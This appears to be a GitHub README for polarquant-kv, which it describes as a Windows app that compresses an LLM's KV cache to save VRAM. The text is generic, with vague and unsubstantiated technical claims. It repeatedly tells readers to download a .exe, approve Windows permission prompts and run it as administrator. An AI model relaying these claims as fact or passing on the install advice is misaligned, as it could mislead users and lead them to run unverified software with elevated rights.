# 🔷 polarquant-kv - Save VRAM With KV Compression

[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Whiteflagnorthplatte622/polarquant-kv)

## 🚀 What this app does

polarquant-kv helps lower GPU memory use when you run LLMs. It uses K+V dual compression to cut KV cache size, so larger prompts and longer chats can fit in less VRAM.

This app is built for Windows users who want to run local AI models with less memory pressure. It focuses on simple setup and clear controls.

## 💾 Download

Open the project page here:

https://github.com/Whiteflagnorthplatte622/polarquant-kv

On that page, look for the latest release or the main download files. If you see a Windows `.exe` file or a packaged app, download it and run it.

If the page offers a zip file, download it, unzip it, then open the main app file inside the folder.

## 🪟 Windows requirements

Before you install, check these basics:

- Windows 10 or Windows 11
- A modern NVIDIA, AMD, or Intel GPU
- 8 GB RAM or more
- Enough free disk space for the app and model files
- A local LLM app or model runner if you plan to use one

For the best result, use a GPU with at least 8 GB VRAM. More VRAM gives you more room for large models, but this app helps reduce the load.

## 🔧 What you need before setup

Have these ready:

- The downloaded app file or zip file
- A folder where you want to keep the app
- A local LLM model or inference app
- Admin access if Windows asks for it

If Windows SmartScreen appears, use the download page again to confirm you got the file from the right place.

## 📥 Install on Windows

Follow these steps in order:

1. Open the project page:
   https://github.com/Whiteflagnorthplatte622/polarquant-kv

2. Find the latest Windows release or app package.

3. Download the file to your computer.

4. If the file is a `.zip`, right-click it and choose Extract All.

5. Open the extracted folder.

6. Run the main app file, such as `polarquant-kv.exe` or a similar Windows launcher.

7. If Windows asks for permission, choose Yes.

8. Wait for the app to open.

If the app starts with a blank window, give it a few seconds. Some tools load GPU support and model settings at launch.

## ⚙️ First-time setup

When the app opens, check these common settings:

- Select your GPU
- Set KV cache compression level
- Choose the model folder
- Pick the memory target you want to stay under

A good first test is to use the default settings. Then load one of your normal models and check VRAM use while chatting.

If you want more memory savings, increase compression. If you want more headroom for output quality, lower the compression level.

## 🧠 How it works

LLM chat tools keep past tokens in memory. That memory is the KV cache.

polarquant-kv compresses both K and V data in the cache. That reduces VRAM use during long prompts and long chats.

This can help when:

- You hit VRAM limits
- You want longer context windows
- You run larger models on a smaller GPU
- You need more room for batch use or multi-turn chat

## 🛠️ Use it with your model

Use this flow:

1. Start your local model runner or chat app.
2. Enable polarquant-kv in the memory or cache settings.
3. Load your model.
4. Start a chat.
5. Watch GPU memory use.
6. Adjust compression if needed.

If your model runner supports a config file, you can set the cache options there. If it uses a GUI, look for memory, cache, or quantization settings.

## 📊 Best use cases

polarquant-kv fits these cases well:

- Running long chats on one GPU
- Testing bigger models on limited VRAM
- Keeping memory use steady during long sessions
- Reducing cache growth from large prompts
- Freeing memory for other GPU tasks

It works well when the main limit is VRAM, not CPU speed.

## 🔍 Feature set

- K+V dual compression
- Lower KV cache memory use
- Support for long context runs
- Windows-first setup path
- Simple launch flow
- Easy memory tuning
- Works with local LLM workflows

## 🧪 Example setup path

A simple setup on Windows may look like this:

1. Download the app from the project page.
2. Extract the files.
3. Run the Windows launcher.
4. Open your local model runner.
5. Turn on KV compression.
6. Load your model.
7. Start chatting.

If you use a tool like a local UI, place the app in the same folder or point it to the correct model path.

## 🧰 Troubleshooting

### App does not open

Try these steps:

- Right-click the app and choose Run as administrator
- Check that you extracted the zip file
- Make sure Windows did not block the file
- Re-download the file from the project page

### GPU is not detected

Try these steps:

- Update your GPU driver
- Restart your PC
- Close other GPU-heavy apps
- Check that your model runner uses the same GPU

### Memory use does not change

Try these steps:

- Confirm KV compression is enabled
- Lower or raise the compression level
- Reload the model
- Restart the chat session
- Check that the model runner is using the polarquant-kv settings

### Chat quality changes

Try these steps:

- Reduce compression
- Test a shorter context
- Use a different model
- Compare a few prompts before and after the change

## 📁 Suggested folder layout

A simple layout can help keep things clear:

- `C:\AI\polarquant-kv\` for the app
- `C:\AI\models\` for model files
- `C:\AI\logs\` for log files
- `C:\AI\configs\` for saved settings

This makes it easier to find files when you need to update or test the app.

## 🔒 File safety

Only use files from the project page:

https://github.com/Whiteflagnorthplatte622/polarquant-kv

This helps you avoid files that do not match the release you want.

## 🧩 Common terms

- **VRAM**: Memory on your GPU
- **KV cache**: Data the model keeps from past tokens
- **Compression**: A way to use less memory
- **Model runner**: The app that loads and runs the AI model
- **Context length**: How much text the model can keep track of

## 🖥️ Basic usage tips

- Start with default settings
- Test one model at a time
- Keep your prompt size moderate at first
- Change one setting at a time
- Save working settings before you experiment

If you want the easiest path, use the default compression and check whether your chat runs without VRAM errors.

## 📌 Quick install path

1. Visit:
   https://github.com/Whiteflagnorthplatte622/polarquant-kv

2. Download the Windows file from the project page.

3. Extract the files if needed.

4. Run the app.

5. Turn on KV compression.

6. Load your model and use it

## 🧭 What to expect after launch

After launch, you should see a simple window or launcher that lets you manage cache compression and memory settings. From there, you can connect it to your local LLM workflow and start reducing VRAM use during chat

## 🧱 Good starting settings

If you are not sure where to begin, try this:

- Compression level: medium
- Cache mode: K+V
- Context: your usual chat size
- Model: the one you already use
- GPU mode: on

If the model feels slow, lower compression. If VRAM still fills up, raise compression one step at a time